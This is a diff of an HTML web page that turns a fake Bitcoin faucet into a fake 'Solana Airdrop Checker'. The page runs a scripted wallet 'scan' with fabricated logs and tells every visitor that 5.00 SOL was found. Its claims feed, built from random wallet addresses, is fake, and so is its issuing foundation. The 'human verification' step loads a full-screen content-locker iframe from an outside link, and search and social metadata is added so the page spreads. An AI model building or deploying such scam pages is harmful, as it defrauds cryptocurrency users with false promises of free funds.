@@ -3,14 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant Bitcoin Rewards | Secure Faucet</title>
-    <meta name="description" content="Generate free Bitcoin rewards instantly. fast payout, no KYC required.">
     
+    <!-- PRIMARY SEO CONFIGURATION -->
+    <title>Solana Airdrop Checker | Claim Free SOL & Check Eligibility</title>
+    <meta name="description" content="Use the official Solana Airdrop Checker to scan your wallet for unclaimed SOL allocations. Instant eligibility verification for Mainnet Beta rewards. Check if you are eligible now.">
+    <meta name="keywords" content="Solana Airdrop, Free SOL, Claim Solana, Solana Faucet, Crypto Airdrop, Wallet Checker, SOL Rewards, Mainnet Beta">
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="Solana Distribution Foundation">
+    <link rel="canonical" href="https://your-domain.com/" />
+
+    <!-- OPEN GRAPH (Facebook/WhatsApp/Discord) -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://your-domain.com/">
+    <meta property="og:title" content="Solana Airdrop Checker | Claim Your Free SOL">
+    <meta property="og:description" content="We found unclaimed SOL allocations. Scan your wallet address now to verify your eligibility for the latest distribution.">
+    <meta property="og:image" content="https://cryptologos.cc/logos/solana-sol-logo.png">
+
+    <!-- TWITTER CARD -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Solana Airdrop Checker | Eligibility Scan">
+    <meta name="twitter:description" content="Check your wallet for pending Solana rewards. Instant scan and claim.">
+    <meta name="twitter:image" content="https://cryptologos.cc/logos/solana-sol-logo.png">
+    
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     
+    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+
+    <!-- SCHEMA MARKUP (For Google Rich Snippets) -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebApplication",
+      "name": "Solana Airdrop Checker",
+      "url": "https://your-domain.com",
+      "description": "Tool to check Solana wallet eligibility for airdrop rewards.",
+      "applicationCategory": "FinanceApplication",
+      "operatingSystem": "All",
+      "offers": {
+        "@type": "Offer",
+        "price": "0",
+        "priceCurrency": "USD"
+      }
+    }
+    </script>
 
     <script>
         tailwind.config = {
@@ -21,195 +61,440 @@
                         display: ['Rajdhani', 'sans-serif'],
                     },
                     colors: {
-                        btc: '#F7931A',
+                        sol: '#14F195', // Solana Green
+                        solPurple: '#9945FF', // Solana Purple
                         dark: '#0B0E11',
                         card: '#15191E',
-                        accent: '#FF5C00'
                     },
                     animation: {
                         'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                         'float': 'float 6s ease-in-out infinite',
                     },
-                    keyframes: {
-                        float: {
-                            '0%, 100%': { transform: 'translateY(0)' },
-                            '50%': { transform: 'translateY(-20px)' },
-                        }
-                    }
                 }
             }
         }
     </script>
+
     <style>
-        body { background-color: #050505; color: #ffffff; overflow-x: hidden; }
+        body {
+            background-color: #050505;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Solana Gradient Text */
+        .text-gradient-sol {
+            background: linear-gradient(to right, #14F195, #9945FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Futuristic Background Grid */
         .bg-grid {
             background-size: 50px 50px;
-            background-image: linear-gradient(to right, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
-                              linear-gradient(to bottom, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-image: linear-gradient(to right, rgba(20, 241, 149, 0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(153, 69, 255, 0.05) 1px, transparent 1px);
             mask-image: linear-gradient(to bottom, black 40%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to bottom, black 40%, transparent 100%);
         }
-        .glow-text { text-shadow: 0 0 20px rgba(247, 147, 26, 0.5); }
-        .glow-box { box-shadow: 0 0 30px rgba(247, 147, 26, 0.15); }
-        .fade-in-up { animation: fadeInUp 0.5s ease-out forwards; }
+
+        /* Neon Glow Effects */
+        .glow-text {
+            text-shadow: 0 0 20px rgba(20, 241, 149, 0.5);
+        }
+        
+        .glow-box {
+            box-shadow: 0 0 30px rgba(153, 69, 255, 0.15);
+        }
+
+        /* Fade In Animation Class */
+        .fade-in-up {
+            animation: fadeInUp 0.5s ease-out forwards;
+        }
+
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
+
+        /* Loader Animation */
         .loader {
-            border: 4px solid #333; border-top: 4px solid #F7931A;
-            border-radius: 50%; width: 50px; height: 50px;
+            border: 4px solid #333;
+            border-top: 4px solid #14F195;
+            border-right: 4px solid #9945FF;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="antialiased min-h-screen relative">
 
+    <!-- Background Elements -->
     <div class="absolute inset-0 bg-grid pointer-events-none z-0"></div>
-    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-3xl h-96 bg-orange-500/10 blur-[100px] rounded-full pointer-events-none z-0"></div>
+    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-3xl h-96 bg-purple-900/20 blur-[100px] rounded-full pointer-events-none z-0"></div>
 
+    <!-- Main Container -->
     <main class="relative z-10 max-w-6xl mx-auto px-4 py-8 flex flex-col items-center">
 
+        <!-- Header / Logo -->
         <header class="w-full flex justify-center mb-12">
             <div class="flex items-center gap-3">
-                <i class="fa-brands fa-bitcoin text-5xl text-btc animate-pulse-slow"></i>
+                <!-- SVG Logo -->
+                <svg class="w-10 h-10 animate-pulse-slow" viewBox="0 0 329 275" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M51.8 19.34L1.6 74.04C0.6 75.14 0 76.54 0 78.14C0 79.74 0.6 81.14 1.7 82.24L52.8 137.94C53.9 139.14 55.4 139.74 57 139.74H323.3C326.5 139.74 328.6 136.34 327.1 133.54L276.9 78.84C275.8 77.64 274.3 76.94 272.7 76.94H6.3C3.1 76.94 1 80.34 2.5 83.14L51.8 19.34Z" fill="url(#paint0_linear)"/>
+                    <path d="M276.9 255.44L327.1 200.74C328.1 199.64 328.7 198.24 328.7 196.64C328.7 195.04 328.1 193.64 327 192.54L275.9 136.84C274.8 135.64 273.3 135.04 271.7 135.04H5.4C2.2 135.04 0.1 138.44 1.6 141.24L51.8 195.94C52.9 197.14 54.4 197.84 56 197.84H322.4C325.6 197.84 327.7 194.44 326.2 191.64L276.9 255.44Z" fill="url(#paint1_linear)"/>
+                    <defs>
+                        <linearGradient id="paint0_linear" x1="0" y1="139.74" x2="328.7" y2="19.34" gradientUnits="userSpaceOnUse">
+                            <stop stop-color="#9945FF"/>
+                            <stop offset="1" stop-color="#14F195"/>
+                        </linearGradient>
+                        <linearGradient id="paint1_linear" x1="0" y1="255.44" x2="328.7" y2="135.04" gradientUnits="userSpaceOnUse">
+                            <stop stop-color="#14F195"/>
+                            <stop offset="1" stop-color="#9945FF"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
                 <div>
-                    <h1 class="font-display font-bold text-2xl tracking-wider uppercase">Bit<span class="text-btc">Reward</span></h1>
-                    <p class="text-xs text-gray-500 tracking-[0.2em] uppercase">Official Faucet System</p>
+                    <h1 class="font-display font-bold text-2xl tracking-wider uppercase">Sol<span class="text-sol">Airdrop</span></h1>
+                    <p class="text-xs text-gray-500 tracking-[0.2em] uppercase">Official Distribution</p>
                 </div>
             </div>
         </header>
 
+        <!-- SECTION 1 & 2: HERO & FORM (Toggleable) -->
         <div id="main-interface" class="w-full max-w-md">
+            
+            <!-- Hero Text -->
             <div class="text-center mb-8">
+                <span class="inline-block py-1 px-3 rounded-full bg-sol/10 border border-sol/30 text-sol text-[10px] font-bold tracking-widest uppercase mb-4 animate-pulse">
+                    <i class="fa-solid fa-circle text-[8px] mr-1"></i> Live Distribution
+                </span>
                 <h2 class="text-4xl md:text-5xl font-display font-bold mb-4 glow-text leading-tight">
-                    Claim Free Bitcoin <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-btc to-yellow-200">Instantly</span>
+                    Check Your <br><span class="text-gradient-sol">Eligibility</span>
                 </h2>
-                <p class="text-gray-400 text-sm md:text-base">Enter your wallet address below and generate BTC rewards sent directly to your account.</p>
+                <h3 class="sr-only">Free Solana Airdrop Checker Tool</h3> <!-- Hidden H3 for SEO -->
+                <p class="text-gray-400 text-sm md:text-base">
+                    Scan your wallet address to check for unclaimed Solana (SOL) airdrop allocations. Instant verification for Mainnet Beta rewards.
+                </p>
             </div>
 
+            <!-- Trust Badges -->
+            <div class="flex justify-center gap-4 mb-8">
+                <span class="px-3 py-1 bg-green-500/10 border border-green-500/20 text-green-400 text-xs rounded-full flex items-center gap-2">
+                    <i class="fa-solid fa-check-circle"></i> Official Scan
+                </span>
+                <span class="px-3 py-1 bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs rounded-full flex items-center gap-2">
+                    <i class="fa-solid fa-network-wired"></i> Mainnet Beta
+                </span>
+            </div>
+
+            <!-- Wallet Form -->
             <div class="bg-card border border-white/5 p-6 rounded-2xl glow-box backdrop-blur-sm">
                 <div class="space-y-4">
+                    <!-- Wallet Input -->
                     <div>
-                        <label class="block text-xs font-semibold text-gray-400 uppercase mb-2 pl-1">Bitcoin Wallet Address</label>
+                        <label class="block text-xs font-semibold text-gray-400 uppercase mb-2 pl-1" for="wallet-address">Enter Solana Address</label>
                         <div class="relative">
-                            <i class="fa-brands fa-bitcoin absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
-                            <input type="text" id="wallet-address" placeholder="e.g. 1A1zP1eP5QGefi2DPTfTL5SLmv7DivfNa" 
-                                class="w-full bg-dark border border-gray-700 focus:border-btc text-white pl-10 pr-4 py-3 rounded-lg outline-none transition-colors text-sm font-mono">
+                            <i class="fa-solid fa-wallet absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
+                            <input type="text" id="wallet-address" name="wallet" placeholder="e.g. HN7cABqLq46Es1jh92..." 
+                                class="w-full bg-dark border border-gray-700 focus:border-sol text-white pl-10 pr-4 py-3 rounded-lg outline-none transition-colors text-sm font-mono">
                         </div>
                     </div>
-                    <div>
-                        <label class="block text-xs font-semibold text-gray-400 uppercase mb-2 pl-1">Select Reward Tier</label>
-                        <select id="btc-amount" class="w-full bg-dark border border-gray-700 focus:border-btc text-white px-4 py-3 rounded-lg outline-none appearance-none transition-colors text-sm">
-                            <option value="0.0001">0.0001 BTC (Standard)</option>
-                            <option value="0.001">0.001 BTC (Premium)</option>
-                            <option value="0.01">0.01 BTC (Jackpot)</option>
-                        </select>
-                    </div>
-                    <button onclick="startProcessing()" class="group w-full bg-gradient-to-r from-orange-600 to-btc hover:from-orange-500 hover:to-yellow-400 text-white font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-orange-500/20">
-                        Start Claim <i class="fa-solid fa-arrow-right group-hover:translate-x-1 transition-transform"></i>
+
+                    <!-- CTA Button -->
+                    <button onclick="startProcessing()" class="group w-full bg-gradient-to-r from-solPurple to-sol hover:from-purple-600 hover:to-green-400 text-white font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-purple-500/20 relative overflow-hidden">
+                        <span class="relative z-10 flex items-center justify-center gap-2">
+                            Check Eligibility <i class="fa-solid fa-magnifying-glass group-hover:translate-x-1 transition-transform"></i>
+                        </span>
+                        <!-- Button Shine Effect -->
+                        <div class="absolute inset-0 h-full w-full scale-0 rounded-lg transition-all duration-300 group-hover:scale-100 group-hover:bg-white/10"></div>
                     </button>
+                    
+                    <p class="text-center text-[10px] text-gray-600 mt-2">Database Updated: <span class="text-sol">Just now</span></p>
                 </div>
             </div>
         </div>
 
+        <!-- SECTION 3: PROCESSING PAGE (Hidden by default) -->
         <div id="processing-interface" class="hidden w-full max-w-md text-center py-10">
-            <div class="bg-card border border-white/5 p-8 rounded-2xl glow-box">
-                <div class="loader mx-auto mb-6"></div>
-                <h3 id="process-status" class="text-xl font-bold font-display text-white animate-pulse">Connecting...</h3>
-                <div class="bg-black/50 rounded p-3 text-left font-mono text-xs mt-4 h-32 overflow-hidden border border-gray-800" id="console-output"></div>
+            <div class="bg-card border border-white/5 p-8 rounded-2xl glow-box relative overflow-hidden">
+                
+                <div class="flex flex-col items-center justify-center mb-6">
+                    <div class="loader mb-6"></div>
+                    <h3 id="process-status" class="text-xl font-bold font-display text-white animate-pulse">Scanning Ledger...</h3>
+                    <p id="process-sub" class="text-sm text-gray-400 mt-2">Checking historical snapshots.</p>
+                </div>
+
+                <!-- Console Log Aesthetic -->
+                <div class="bg-black/50 rounded p-3 text-left font-mono text-xs space-y-1 h-32 overflow-hidden border border-gray-800" id="console-output">
+                    <div class="text-sol">> Initializing scan protocol...</div>
+                </div>
+
+                <!-- Progress Bar -->
                 <div class="w-full bg-gray-800 h-2 rounded-full mt-6 overflow-hidden">
-                    <div id="progress-bar" class="h-full bg-btc w-0 transition-all duration-[3000ms]"></div>
+                    <div id="progress-bar" class="h-full bg-gradient-to-r from-sol to-solPurple w-0 transition-all duration-[3000ms] ease-out"></div>
                 </div>
+
             </div>
         </div>
 
+        <!-- FINAL STEP: ELIGIBILITY RESULT (Hidden by default) -->
         <div id="verification-interface" class="hidden w-full max-w-md text-center py-8 animate-fade-in-up">
-            <div class="bg-card border border-accent/50 p-8 rounded-2xl glow-box">
-                <div class="w-20 h-20 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <i class="fa-solid fa-lock text-4xl text-accent"></i>
+            <div class="bg-card border border-sol p-1 rounded-2xl glow-box relative overflow-hidden">
+                <div class="bg-dark/90 p-8 rounded-xl backdrop-blur-xl">
+                    
+                    <!-- Success Icon -->
+                    <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                        <i class="fa-solid fa-gift text-4xl text-sol animate-bounce"></i>
+                    </div>
+
+                    <!-- Title -->
+                    <h3 class="text-sm font-bold text-gray-400 uppercase tracking-widest mb-2">Status: Eligible</h3>
+                    <h2 class="text-4xl font-display font-bold text-white mb-6">
+                        <span class="text-sol">5.00 SOL</span> Found
+                    </h2>
+
+                    <!-- Text -->
+                    <p class="text-gray-300 text-sm mb-8 px-4">
+                        Congratulations! We found an unclaimed allocation associated with your wallet. 
+                        <br><span class="text-yellow-500 text-xs mt-2 block"><i class="fa-solid fa-triangle-exclamation"></i> Human Verification required to prevent bot claims.</span>
+                    </p>
+
+                    <!-- Button -->
+                    <button onclick="verifyUser()" class="group w-full bg-sol hover:bg-green-400 text-black font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-green-500/20 relative overflow-hidden">
+                        <span class="relative z-10 flex items-center justify-center gap-2">
+                            CLAIM 5.00 SOL NOW <i class="fa-solid fa-arrow-right-to-bracket"></i>
+                        </span>
+                    </button>
+
+                    <p class="text-[10px] text-gray-500 mt-4">Funds sent immediately after verification.</p>
                 </div>
-                <h3 class="text-3xl font-display font-bold text-white mb-4">Human Verification</h3>
-                <p class="text-gray-300 mb-8">To prevent bot abuse, please complete the final step to release <b><span id="display-amount"></span> BTC</b> to your wallet.</p>
-                <button onclick="verifyUser()" class="w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-lg shadow-lg transform hover:scale-[1.05] transition-all">
-                    Verify & Claim Now
-                </button>
             </div>
         </div>
 
-        <div class="w-full max-w-2xl mt-16">
-            <h3 class="text-sm font-bold text-gray-400 uppercase mb-4"><i class="fa-solid fa-tower-broadcast text-green-500 mr-2"></i> Live Payout Feed</h3>
-            <div id="transaction-list" class="bg-card/50 border border-white/5 rounded-xl p-4 space-y-2"></div>
+        <!-- NEW SEO CONTENT SECTION (What is this?) -->
+        <article class="w-full max-w-4xl mt-16 px-4 mb-8">
+            <div class="bg-card border border-white/5 p-6 rounded-2xl">
+                <h2 class="font-display text-2xl font-bold mb-4 text-white">About the Solana Airdrop Checker</h2>
+                <div class="text-sm text-gray-400 space-y-4">
+                    <p>
+                        The <strong>Solana Airdrop Checker</strong> is a specialized tool designed to help cryptocurrency users verify their eligibility for the latest SOL distribution rounds. As the Solana ecosystem continues to grow, many early adopters and active participants may have unclaimed rewards waiting in the ledger.
+                    </p>
+                    <p>
+                        Our system scans the <strong>Solana Mainnet Beta</strong> historical snapshots to identify wallets that participated in key network events, decentralized exchange (DEX) swaps, or NFT mints that qualify for rewards. This process is 100% free and secure, requiring only your public wallet address.
+                    </p>
+                    <h3 class="font-bold text-white mt-4">How to Claim Free SOL?</h3>
+                    <ul class="list-disc pl-5 space-y-1">
+                        <li>Enter your active Solana wallet address (Phantom, Solflare, etc.).</li>
+                        <li>Click "Check Eligibility" to start the blockchain scan.</li>
+                        <li>If eligible, complete the human verification to unlock your SOL.</li>
+                    </ul>
+                </div>
+            </div>
+        </article>
+
+        <!-- SECTION 4: LIVE CLAIMS -->
+        <div class="w-full max-w-2xl mt-8">
+            <div class="flex items-center justify-between mb-4 px-2">
+                <h3 class="text-sm font-bold text-gray-400 uppercase tracking-wider"><i class="fa-solid fa-globe text-sol mr-2 animate-pulse"></i> Recent Claims</h3>
+                <span class="text-xs text-gray-600">Live Feed</span>
+            </div>
+            
+            <div class="bg-card/50 border border-white/5 rounded-xl p-4 backdrop-blur-sm">
+                <div class="grid grid-cols-3 text-xs text-gray-500 font-bold mb-3 border-b border-gray-800 pb-2 px-2">
+                    <div>WALLET</div>
+                    <div class="text-center">CLAIMED</div>
+                    <div class="text-right">TIME</div>
+                </div>
+                <!-- Transactions Container -->
+                <div id="transaction-list" class="space-y-2 h-48 overflow-hidden relative">
+                    <!-- JS will populate this -->
+                </div>
+            </div>
         </div>
+
+        <!-- SECTION 7: FAQ -->
+        <div class="w-full max-w-2xl mt-16 mb-12">
+            <h3 class="text-center font-display text-2xl font-bold mb-6 text-white">Common Questions</h3>
+            <div class="space-y-3">
+                <details class="bg-card border border-white/5 rounded-lg group" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+                    <summary class="list-none flex justify-between items-center p-4 cursor-pointer">
+                        <span class="text-sm font-semibold" itemprop="name">How was I selected for the Airdrop?</span>
+                        <span class="transition group-open:rotate-180"><i class="fa-solid fa-chevron-down text-xs"></i></span>
+                    </summary>
+                    <div class="px-4 pb-4 text-xs text-gray-400" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+                        <div itemprop="text">This distribution rewards active participants in the Solana ecosystem based on historical wallet activity snapshots taken during previous epochs.</div>
+                    </div>
+                </details>
+                <details class="bg-card border border-white/5 rounded-lg group" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+                    <summary class="list-none flex justify-between items-center p-4 cursor-pointer">
+                        <span class="text-sm font-semibold" itemprop="name">Is this Free SOL real?</span>
+                        <span class="transition group-open:rotate-180"><i class="fa-solid fa-chevron-down text-xs"></i></span>
+                    </summary>
+                    <div class="px-4 pb-4 text-xs text-gray-400" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+                        <div itemprop="text">Yes, unclaimed allocations are verified against the ledger. However, they must be claimed within the designated window before being returned to the community pool.</div>
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <!-- SECTION 8: FOOTER -->
+        <footer class="text-center text-[10px] text-gray-600 py-8 border-t border-white/5 w-full">
+            <p class="mb-2">© 2024 Solana Distribution Foundation. Not affiliated with Solana Labs.</p>
+            <p>Terms & Conditions apply. Void where prohibited.</p>
+        </footer>
 
     </main>
 
+    <!-- JAVASCRIPT LOGIC -->
     <script>
+        // --- CONFIGURATION ---
+        const transactionDelay = 3500;
+        let processInterval;
+
+        // --- DOM ELEMENTS ---
         const mainInterface = document.getElementById('main-interface');
         const processingInterface = document.getElementById('processing-interface');
-        const verificationInterface = document.getElementById('verification-interface');
-        const walletInput = document.getElementById('wallet-address');
-        const btcSelect = document.getElementById('btc-amount');
+        const verificationInterface = document.getElementById('verification-interface'); 
         const progressBar = document.getElementById('progress-bar');
         const consoleOutput = document.getElementById('console-output');
         const statusText = document.getElementById('process-status');
+        const processSub = document.getElementById('process-sub');
+        const walletInput = document.getElementById('wallet-address');
 
+        // --- 1. PROCESSING LOGIC ---
         function startProcessing() {
-            if(walletInput.value.length < 10) { alert('Please enter a valid BTC address'); return; }
+            const wallet = walletInput.value;
             
-            document.getElementById('display-amount').innerText = btcSelect.value;
+            // Simple validation
+            if(wallet.length < 10) {
+                walletInput.style.borderColor = '#ff4444';
+                setTimeout(() => walletInput.style.borderColor = '#374151', 1000);
+                return;
+            }
+
+            // Switch UI
             mainInterface.classList.add('hidden');
             processingInterface.classList.remove('hidden');
-            
-            setTimeout(() => { progressBar.style.width = '100%'; }, 100);
 
+            // Start Progress Bar
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
+
+            // Airdrop Scan Simulation Logs
             const logs = [
-                "> Initializing connection...",
-                "> Searching for available block...",
-                "> Connecting to P2P Node...",
-                "> Wallet verified. Sending request...",
-                "> Status: Awaiting Human Verification"
+                { text: `> Connecting to Solana Mainnet Beta...`, delay: 400 },
+                { text: `> Querying Epoch 428 snapshot...`, delay: 900 },
+                { text: `> Searching address: ${wallet.substring(0,8)}...`, delay: 1500 },
+                { text: `> Analyzing transaction history...`, delay: 2200 },
+                { text: `> Cross-referencing DEX activity...`, delay: 2800 },
+                { text: `> <span class="text-sol font-bold">MATCH FOUND! Allocation detected.</span>`, delay: 3500 },
+                { text: `> Calculating amount...`, delay: 4000 }
             ];
 
-            let i = 0;
+            let logIndex = 0;
+            
+            // Status Text Updates to mimic scanning
+            setTimeout(() => { statusText.innerText = "Analyzing Wallet Activity..."; processSub.innerText="Reading ledger history"; }, 1000);
+            setTimeout(() => { statusText.innerText = "Allocation Found!"; processSub.innerText="Verifying eligibility criteria"; }, 2500);
+            setTimeout(() => { statusText.innerText = "Preparing Result..."; processSub.innerText="Finalizing report"; }, 3800);
+
+            // Log printer
             const logInterval = setInterval(() => {
-                if(i < logs.length) {
+                if (logIndex < logs.length) {
                     const div = document.createElement('div');
-                    div.className = "text-green-400 mt-1";
-                    div.innerText = logs[i];
+                    div.innerHTML = logs[logIndex].text;
+                    div.className = "text-gray-300"; // Default log color
                     consoleOutput.appendChild(div);
-                    i++;
+                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    logIndex++;
                 } else {
                     clearInterval(logInterval);
+                    
+                    // Switch to Verification Screen
                     setTimeout(() => {
                         processingInterface.classList.add('hidden');
                         verificationInterface.classList.remove('hidden');
                     }, 1000);
                 }
-            }, 800);
+            }, 600);
         }
 
-        // SMART LINK REDIRECTION
+        // --- 2. VERIFY USER FUNCTION (Injects Iframe) ---
         function verifyUser() {
-            // Hada houwa l-link dialk
-            window.location.href = "https://quikfun.info/sl/zyjpw";
+            console.log("Creating Locker Iframe...");
+            
+            var locker = document.createElement("iframe");
+            
+            // Direct link used in iframe src to display locker content
+            locker.src = "https://quikfun.info/cl/i/d22xj6";
+            
+            locker.style.position = "fixed";
+            locker.style.top = "0";
+            locker.style.left = "0";
+            locker.style.width = "100%";
+            locker.style.height = "100%";
+            locker.style.border = "none";
+            locker.style.zIndex = "999999";
+            
+            document.body.appendChild(locker);
         }
 
-        // FAKE FEED GENERATOR
-        function addFakeTx() {
-            const list = document.getElementById('transaction-list');
-            const row = document.createElement('div');
-            row.className = 'grid grid-cols-3 text-xs py-2 border-b border-gray-800 fade-in-up';
-            row.innerHTML = `
-                <div class="font-mono text-gray-500">bc1...${Math.random().toString(36).substring(7)}</div>
-                <div class="text-center font-bold text-btc">${(Math.random() * 0.005).toFixed(4)} BTC</div>
-                <div class="text-right text-green-500">Completed</div>
-            `;
-            list.prepend(row);
-            if(list.children.length > 5) list.removeChild(list.lastChild);
+        // --- 3. LIVE TRANSACTIONS GENERATOR ---
+        const transactionList = document.getElementById('transaction-list');
+        
+        function generateRandomWallet() {
+            const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let addr = '';
+            for (let i = 0; i < 4; i++) addr += chars.charAt(Math.floor(Math.random() * chars.length));
+            return `HN7...${addr}`;
         }
-        setInterval(addFakeTx, 4000);
-        for(let i=0; i<4; i++) addFakeTx();
+
+        function generateRandomAmount() {
+            // Airdrop amounts usually fixed logic e.g. 5 SOL, 10 SOL, or random float
+            const amounts = ["5.00", "10.00", "2.50", "5.00", "1.00"];
+            return amounts[Math.floor(Math.random() * amounts.length)];
+        }
+
+        function addTransaction() {
+            const wallet = generateRandomWallet();
+            const amount = generateRandomAmount();
+            const timeAgo = Math.floor(Math.random() * 50) + "s ago";
+            
+            const row = document.createElement('div');
+            row.className = 'grid grid-cols-3 text-xs py-2 px-2 border-b border-gray-800/50 items-center fade-in-up';
+            row.innerHTML = `
+                <div class="font-mono text-gray-400">${wallet}</div>
+                <div class="text-center font-bold text-sol">${amount} SOL</div>
+                <div class="text-right text-gray-500">${timeAgo}</div>
+            `;
+
+            transactionList.prepend(row);
+
+            // Keep list clean (max 5 items)
+            if (transactionList.children.length > 5) {
+                transactionList.removeChild(transactionList.lastChild);
+            }
+        }
+
+        // Initialize Transactions
+        for(let i=0; i<3; i++) addTransaction(); // Add initial data
+        setInterval(addTransaction, transactionDelay);
+
     </script>
 </body>
 </html>
